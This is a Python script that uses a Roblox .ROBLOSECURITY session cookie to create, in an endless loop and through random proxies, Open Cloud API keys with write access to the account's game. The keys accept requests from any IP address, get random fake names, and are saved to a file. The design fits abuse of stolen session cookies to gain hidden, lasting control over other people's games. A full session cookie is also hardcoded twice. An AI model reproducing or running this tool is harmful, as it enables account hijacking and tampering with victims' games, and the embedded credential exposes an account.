import requests
from faker import Faker
import random
import sys
import time
class Dashboard:

    def __init__(self):
        proxy = random.choice(open("proxy.txt", "r").readlines()).strip()
        self.session = requests.Session()
        self.session.proxies = {'http': 'http://' + proxy.strip()}

    def generator(self, cookie: str) -> str:

        token_response = self.session.post("https://auth.roblox.com/v2/logout",
                                   cookies={".ROBLOSECURITY": cookie})
        token = token_response.headers["X-CSRF-TOKEN"]

        user_response = self.session.get("https://users.roblox.com/v1/users/authenticated",
                                    headers={'x-csrf-token': token, 'User-Agent': 'Roblox'},
                                    cookies={'.ROBLOSECURITY': cookie})
        user_data = user_response.json()

        user_id = user_data["id"]

        inventory_response = self.session.get(
            f"https://inventory.roblox.com/v2/users/{user_id}/inventory/9?limit=10&sortOrder=Asc",
            headers={'x-csrf-token': token, 'User-Agent': 'Roblox'},
            cookies={'.ROBLOSECURITY': cookie})

        inventory_data = inventory_response.json()

        game_id = inventory_data["data"][0]["assetId"]

        unvid_response = self.session.get(f"https://apis.roblox.com/universes/v1/places/{game_id}/universe")
        unvid_data = unvid_response.json()
        universe_id = unvid_data["universeId"]

        r = self.session.post("https://apis.roblox.com/cloud-authentication/v1/apiKey",
                        headers={"Content-Type": "application/json",
                              'User-Agent': 'Roblox/WinInet',
                              'x-csrf-token': token},
                        cookies={".ROBLOSECURITY": cookie},
                        json={'cloudAuthUserConfiguredProperties': {'name': Faker().word().capitalize(),
                                                                 'description': Faker().word().capitalize(),
                                                                 'isEnabled': True,
                                                                 'allowedCidrs': ['0.0.0.0/0'],
                                                                 'scopes': [{'scopeType': "universe-places",
                                                                             'targetParts': [f"{universe_id}"],
                                                                             'operations': ["write"]
                                                                             }]
                                                                 }
                                }
                        ).json()

        if 'message' in r:
            Dashboard().deleter(cookie)
            return f"Too many API Keys, switch account: {r['message']}"

        with open("keys.txt", "a") as f:
            f.write(r["apikeySecret"] + "\n")

        return f"API Key: {r["apikeySecret"]}"

    def deleter(self, cookie: str) -> str:
        token_response = self.session.post("https://auth.roblox.com/v2/logout",
                                   cookies={".ROBLOSECURITY": cookie})
        token = token_response.headers["X-CSRF-TOKEN"]

        key = random.choice(open("keys.txt", "r").readlines()).strip()
        self.session.delete(f"https://apis.roblox.com/cloud-authentication/v1/apiKey/{key}",
                        headers={'Content-Type': 'application/json',
                                 'User-Agent': 'Roblox/WinInet',
                                 'x-csrf-token': token},
                        cookies={".ROBLOSECURITY": cookie},
                        )
        return f"Deleted an API key: {key}"

if __name__ == "__main__":
    while True:
        time.sleep(1)
        try:
            print(Dashboard().generator("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_634CB9BBD4B6C43617DA24193EA37041A71F2A489B0093403F1F0AB6A1635A7293AFD3931242B9D51CF3CD1E25C6742CEE617BE5AAC5998CB87FFBFA84236F7F65D0C95CED85F5FB9D3F77B7FD4F80F7FC60BF18C074A36959B7A072CAEBC13D66153A958370569952781062A4A6CBADBBB77B990E5C6B7A211B6FB710D7E30D2051A009173D9646255BC5550FAC9944384501F4329A779FE1FC8498153488A986939AE66C296020E120ECA2CFBBAC8356EC67BC84509865589FF7D9EB705C3A184972AA99638D039F1D6653667909B4C148B79ADB07846DD686D137B5EE02F95D8E1C00DA6671513AD0B359AA947FDE1950236DF5268567D8CE6D32B9C94C972A571C77B70F057CC71E02511E8E97E967D9F95B59433A372E9734A36A669AFA060921A07D050F33C9BC78F2A8323EEAE1E4C9F0DA34CAFB85B1299FCD23A515BACDA7E18FC0C9DEFF92CAF0B5D5057FB2EE614357E422B24B2CCFF8FFCB1321967CE2C8B9E2EDFDD10A9011728FD46032E3626A85DE96E8E8E1F8BF9D43668C170E2FE3510E3FC5ED60FCE200AAB18CE8F2257A1CB514E3DA3B288225D263ED0845FB8757AE24726F02964AAA26F420D09CDECCA42D16750A626339C4880BDDF2D1EAEB42340B4D3BA572D23FF155B748D603D9E25746EFF6A185E0230C950CEBCF56FAB460A285D5EB494CB25C7B9645B8325558D1A0E295857A8D6F3DD688DA460F298D98AAF799627756C01DE9AD4B2572062071CB3FC6E25FFE1217D4A50F0F720EA8FD160FC3CF16E4D55CD13A4945C6B69333A25648F1A22FB6F5D28DD411C0722EF37DC9D15B179547AFA51CEB57AF8246F605628C64D4A36EE32A93C805BE1608FD9F5C98567E90093F91C6F3E2BA6EDE043B3E105F643C7A089DC84E3E0C0999953FCDBCD807F5468DDBE14F03BAC8E4D533E8102A68025628C76ED8AE30916061A9A23E0BDF7554CC45E6F63ACA534C9252FC1CD76A946C86BC86CFEE49248929DFAFE451A31D11A6A7263EAE95D376FB90FDBACB42C405569627085CC0570B4D3DB1EFE9FBDBFB718F663A90F294"))
        except requests.exceptions.ConnectionError:
            print(Dashboard().deleter("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_634CB9BBD4B6C43617DA24193EA37041A71F2A489B0093403F1F0AB6A1635A7293AFD3931242B9D51CF3CD1E25C6742CEE617BE5AAC5998CB87FFBFA84236F7F65D0C95CED85F5FB9D3F77B7FD4F80F7FC60BF18C074A36959B7A072CAEBC13D66153A958370569952781062A4A6CBADBBB77B990E5C6B7A211B6FB710D7E30D2051A009173D9646255BC5550FAC9944384501F4329A779FE1FC8498153488A986939AE66C296020E120ECA2CFBBAC8356EC67BC84509865589FF7D9EB705C3A184972AA99638D039F1D6653667909B4C148B79ADB07846DD686D137B5EE02F95D8E1C00DA6671513AD0B359AA947FDE1950236DF5268567D8CE6D32B9C94C972A571C77B70F057CC71E02511E8E97E967D9F95B59433A372E9734A36A669AFA060921A07D050F33C9BC78F2A8323EEAE1E4C9F0DA34CAFB85B1299FCD23A515BACDA7E18FC0C9DEFF92CAF0B5D5057FB2EE614357E422B24B2CCFF8FFCB1321967CE2C8B9E2EDFDD10A9011728FD46032E3626A85DE96E8E8E1F8BF9D43668C170E2FE3510E3FC5ED60FCE200AAB18CE8F2257A1CB514E3DA3B288225D263ED0845FB8757AE24726F02964AAA26F420D09CDECCA42D16750A626339C4880BDDF2D1EAEB42340B4D3BA572D23FF155B748D603D9E25746EFF6A185E0230C950CEBCF56FAB460A285D5EB494CB25C7B9645B8325558D1A0E295857A8D6F3DD688DA460F298D98AAF799627756C01DE9AD4B2572062071CB3FC6E25FFE1217D4A50F0F720EA8FD160FC3CF16E4D55CD13A4945C6B69333A25648F1A22FB6F5D28DD411C0722EF37DC9D15B179547AFA51CEB57AF8246F605628C64D4A36EE32A93C805BE1608FD9F5C98567E90093F91C6F3E2BA6EDE043B3E105F643C7A089DC84E3E0C0999953FCDBCD807F5468DDBE14F03BAC8E4D533E8102A68025628C76ED8AE30916061A9A23E0BDF7554CC45E6F63ACA534C9252FC1CD76A946C86BC86CFEE49248929DFAFE451A31D11A6A7263EAE95D376FB90FDBACB42C405569627085CC0570B4D3DB1EFE9FBDBFB718F663A90F294"))
            sys.exit(0)
